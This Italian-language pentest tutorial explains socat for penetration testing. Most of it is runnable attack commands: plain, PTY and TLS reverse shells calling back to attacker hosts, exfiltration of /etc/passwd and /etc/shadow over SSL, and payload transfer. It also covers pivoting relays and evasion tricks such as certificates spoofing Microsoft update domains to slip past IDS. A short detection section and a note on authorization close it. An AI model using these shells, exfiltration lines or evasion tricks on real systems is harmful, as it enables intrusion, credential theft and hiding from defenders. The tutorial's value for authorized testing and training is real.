---
title: 'Socat: La Swiss Army Knife del Networking per Pentest e Pivoting'
slug: socat
description: 'Socat per networking avanzato: relay, port forwarding, reverse shell e tunnel criptati. Il coltellino svizzero per connessioni di rete nel pentest.'
image: /SOCAT.webp
draft: true
date: 2026-02-27T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - tunneling
  - pivoting
---

**Socat** è il coltellino svizzero del networking, capace di creare connessioni bidirezionali tra praticamente qualsiasi tipo di data channel. Dove [Netcat](https://hackita.it/articoli/netcat) si ferma, Socat continua: supporta SSL/TLS, IPv6, proxy SOCKS, e decine di altri protocolli. In questa guida impari a usare Socat per reverse shell criptate, port forwarding avanzato e relay di connessioni in scenari di penetration test.

## Posizione nella Kill Chain

Socat è un tool trasversale usato in multiple fasi:

| Fase           | Uso Socat              | Esempio                           |
| -------------- | ---------------------- | --------------------------------- |
| Initial Access | Reverse shell criptata | Shell SSL che bypassa IDS         |
| Execution      | Listener stabilizzato  | Shell interattiva completa        |
| Pivoting       | Port forwarding        | Relay connessioni attraverso host |
| Exfiltration   | Tunnel dati            | Trasferimento file criptato       |

## Installazione e Setup

Su Kali Linux Socat è preinstallato:

```bash
socat -V
```

Output atteso:

```
socat by Gerhard Rieger and contributors - see www.dest-unreach.org
socat version 1.7.4.4 on Feb 28 2023
```

Per altre distribuzioni:

```bash
sudo apt install socat -y
```

Compilazione da source per sistemi minimal:

```bash
wget http://www.dest-unreach.org/socat/download/socat-1.7.4.4.tar.gz
tar xzf socat-1.7.4.4.tar.gz
cd socat-1.7.4.4
./configure && make
```

Il binario compilato staticamente è utile per target dove socat non è installato.

## Sintassi Fondamentale

Socat collega due "addresses" bidirezionalmente:

```bash
socat [options] <address1> <address2>
```

Ogni address può essere: TCP, UDP, file, stdin/stdout, exec, SSL, UNIX socket, e altro.

Esempi di address types:

| Address               | Descrizione            |
| --------------------- | ---------------------- |
| `TCP:host:port`       | Connessione TCP client |
| `TCP-LISTEN:port`     | Listener TCP           |
| `UDP:host:port`       | Connessione UDP        |
| `EXEC:command`        | Esegue comando         |
| `STDIN`               | Standard input         |
| `STDOUT`              | Standard output        |
| `OPENSSL:host:port`   | Connessione SSL        |
| `OPENSSL-LISTEN:port` | Listener SSL           |
| `FILE:path`           | File I/O               |

## Reverse Shell con Socat

### Reverse Shell Base

Sul listener (attaccante):

```bash
socat TCP-LISTEN:4444,reuseaddr,fork STDOUT
```

Sul target:

```bash
socat TCP:192.168.1.50:4444 EXEC:/bin/bash
```

### Reverse Shell Interattiva (PTY)

Per una shell completamente interattiva con job control:

Listener:

```bash
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

Target:

```bash
socat TCP:192.168.1.50:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

Questa configurazione fornisce:

* PTY completo (tab completion, arrow keys)
* Gestione segnali corretta (Ctrl+C)
* stderr incluso

### Reverse Shell Criptata (SSL/TLS)

Per bypassare IDS/IPS che ispezionano traffico:

Genera certificato:

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt -subj "/CN=legitimate.com"
cat shell.key shell.crt > shell.pem
```

Listener SSL:

```bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,reuseaddr,fork STDOUT
```

Target:

```bash
socat OPENSSL:192.168.1.50:443,verify=0 EXEC:/bin/bash,pty,stderr
```

Il traffico appare come normale HTTPS, molto più difficile da rilevare.

## Port Forwarding

### Local Port Forward

Rendi accessibile un servizio remoto su una porta locale:

```bash
socat TCP-LISTEN:8080,fork TCP:internal-server:80
```

Ora `localhost:8080` raggiunge `internal-server:80`.

### Remote Port Forward

Esponi un servizio locale attraverso un host remoto:

```bash
socat TCP-LISTEN:8080,fork TCP:localhost:80
```

### Port Forward con Bind a Interfaccia Specifica

```bash
socat TCP-LISTEN:8080,bind=192.168.1.50,fork TCP:10.10.10.100:22
```

Forwarda solo richieste che arrivano sull'IP specificato.

## Scenari Pratici di Penetration Test

### Scenario 1: Reverse Shell Stealth attraverso Firewall

**Timeline stimata: 10 minuti**

Il target ha egress filtering ma permette HTTPS (443) outbound.

```bash
# COMANDO: Genera certificato (attaccante)
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt -subj "/CN=update.microsoft.com"
cat shell.key shell.crt > shell.pem

# COMANDO: Listener SSL su 443 (attaccante)
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,reuseaddr,fork file:`tty`,raw,echo=0
```

## OUTPUT ATTESO

```
(in attesa di connessione)
```

```bash
# COMANDO: Connessione dal target
socat OPENSSL:attacker.com:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid
```

## OUTPUT ATTESO

```
victim@target:~$ whoami
victim
victim@target:~$ 
```

### COSA FARE SE FALLISCE

* **"Connection refused"**: Firewall blocca anche 443. Prova DNS tunneling o HTTP.
* **"SSL handshake failed"**: Verifica che il cert sia valido e verify=0 sia su entrambi i lati.

### Scenario 2: Pivoting attraverso Host Compromesso

**Timeline stimata: 15 minuti**

Hai accesso a un server DMZ e vuoi raggiungere la rete interna.

```bash
# COMANDO: Sul server DMZ, crea relay
socat TCP-LISTEN:8888,fork TCP:10.10.10.50:22

# COMANDO: Dalla tua macchina, connettiti
ssh user@dmz-server -p 8888
# In realtà raggiungi 10.10.10.50:22
```

Per relay più complesso con multiple hop:

```bash
# DMZ server
socat TCP-LISTEN:9999,fork TCP:internal-server:3389

# Tua macchina
rdesktop dmz-server:9999
```

### Scenario 3: Exfiltrazione Dati Criptata

**Timeline stimata: 5 minuti**

```bash
# COMANDO: Listener per ricevere file (attaccante)
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:received_data.tar.gz,create

# COMANDO: Invia file dal target
tar czf - /etc/passwd /etc/shadow | socat - OPENSSL:attacker:443,verify=0
```

### Scenario 4: UDP Relay per DNS Tunneling

```bash
# COMANDO: Relay UDP
socat UDP-LISTEN:53,fork UDP:dns-tunnel-server:53
```

## Tecniche Avanzate

### Fork per Connessioni Multiple

L'opzione `fork` permette di gestire connessioni multiple:

```bash
socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash
```

Senza fork, dopo la prima connessione il listener termina.

### Timeout e Keep-Alive

```bash
socat TCP-LISTEN:4444,keepalive,keepidle=10,keepintvl=10,keepcnt=3 EXEC:/bin/bash
```

Mantiene connessioni attive e rileva disconnessioni.

### Logging Connessioni

```bash
socat -v TCP-LISTEN:8080,fork TCP:target:80
```

L'opzione `-v` mostra tutto il traffico in hex, utile per debugging.

### Trasferimento File

Da attaccante a target:

```bash
# Attaccante
socat TCP-LISTEN:9999 FILE:payload.exe

# Target
socat TCP:attacker:9999 FILE:payload.exe,create
```

## Integration Matrix

| Socat +                                                | Risultato             | Comando                     |
| ------------------------------------------------------ | --------------------- | --------------------------- |
| [Metasploit](https://hackita.it/articoli/metasploit)   | Relay Meterpreter     | Socat relay → multi/handler |
| [Chisel](https://hackita.it/articoli/chisel)           | Cascata tunnel        | Socat SSL → Chisel SOCKS    |
| [Nmap](https://hackita.it/articoli/nmap)               | Scan attraverso relay | Socat forward → nmap target |
| [ProxyChains](https://hackita.it/articoli/proxychains) | Catena proxy          | Socat SOCKS → proxychains   |

## Confronto Socat vs Netcat

| Caratteristica | Socat       | Netcat                |
| -------------- | ----------- | --------------------- |
| SSL/TLS        | Nativo      | No (richiede stunnel) |
| PTY support    | Sì          | No                    |
| IPv6           | Sì          | Dipende versione      |
| Complessità    | Alta        | Bassa                 |
| Flessibilità   | Estrema     | Media                 |
| Disponibilità  | Meno comune | Quasi sempre presente |

**Quando usare Socat**: serve SSL, PTY interattivo, relay complessi.

**Quando usare Netcat**: tool non presente, operazioni semplici, quick wins.

## Defense Evasion

### Tecnica 1: SSL su Porta Standard

```bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork ...
```

Traffico su 443 con SSL appare legittimo.

### Tecnica 2: Certificato con CN Legittimo

```bash
openssl req -newkey rsa:2048 -nodes -keyout k.key -x509 -days 30 -out k.crt -subj "/CN=windowsupdate.microsoft.com"
```

Certificate inspection potrebbe non flaggare.

### Tecnica 3: Bind su Localhost

Se hai già accesso, bind solo su localhost per evitare detection network:

```bash
socat TCP-LISTEN:4444,bind=127.0.0.1 ...
```

## Detection e Countermeasures

### Cosa Cerca il Blue Team

* Processo socat attivo
* Connessioni SSL su porte non standard
* Listener su porte insolite
* Pattern di traffico relay

### IOCs

```bash
# Cerca processi socat
ps aux | grep socat

# Connessioni sospette
netstat -tupn | grep socat
```

## Troubleshooting

### "Address already in use"

```bash
socat TCP-LISTEN:4444,reuseaddr ...
```

L'opzione `reuseaddr` permette riutilizzo immediato della porta.

### Shell non interattiva

Assicurati di usare le opzioni PTY:

```bash
EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### SSL Handshake Failed

Verifica:

1. Certificato valido e leggibile
2. `verify=0` su entrambi i lati
3. Nessun proxy che interferisce

### Connessione Lenta

Per connessioni high-latency:

```bash
socat -T 30 TCP-LISTEN:4444 ...
```

Aumenta timeout.

## Cheat Sheet Comandi

| Operazione    | Comando                                               |
| ------------- | ----------------------------------------------------- |
| Listener base | `socat TCP-LISTEN:port,fork STDOUT`                   |
| Reverse shell | `socat TCP:ip:port EXEC:/bin/bash`                    |
| Shell PTY     | `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:port\`      |
| Shell SSL     | `socat OPENSSL-LISTEN:443,cert=c.pem,verify=0 STDOUT` |
| Port forward  | `socat TCP-LISTEN:local,fork TCP:remote:port`         |
| File transfer | `socat TCP-LISTEN:port FILE:file,create`              |
| UDP relay     | `socat UDP-LISTEN:port,fork UDP:target:port`          |

## FAQ

**Socat vs Netcat per reverse shell?**

Socat per shell PTY interattive e SSL. Netcat per quick shell quando socat non è disponibile.

**Come ottengo Socat sul target?**

Compila staticamente e trasferisci, oppure usa one-liner equivalenti con bash/python se socat non è installabile.

**Il traffico SSL è davvero nascosto?**

Il contenuto sì, ma i pattern di traffico (timing, volume) possono essere analizzati. Non è invisibile, solo più difficile da ispezionare.

**È legale usare Socat?**

Solo su sistemi autorizzati. Per penetration test professionali, [hackita.it/servizi](https://hackita.it/servizi).

***

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

**Risorse**: [Socat Official](http://www.dest-unreach.org/socat/) | [Socat Man Page](https://linux.die.net/man/1/socat)
